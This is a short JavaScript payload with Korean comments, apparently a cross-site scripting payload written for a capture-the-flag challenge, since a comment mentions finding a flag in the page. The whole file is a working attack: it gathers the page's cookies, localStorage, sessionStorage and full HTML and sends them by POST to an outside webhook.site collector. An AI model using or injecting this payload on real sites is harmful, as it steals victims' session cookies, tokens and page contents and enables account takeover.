(async () => {
    async function exfiltrate() {
        let data = {};
        
        // 1. 쿠키 시도
        data.cookie = document.cookie;
        
        // 2. 스토리지 시도
        data.localStorage = JSON.stringify(localStorage);
        data.sessionStorage = JSON.stringify(sessionStorage);
        
        // 3. 현재 페이지의 HTML 소스 (HttpOnly 쿠키일 경우 여기서 플래그 발견 가능성 높음)
        data.html = document.documentElement.innerHTML;

        // 데이터 전송 (양이 많을 수 있으므로 POST 추천, GET은 잘릴 수 있음)
        fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        });
    }
    await exfiltrate();
})();
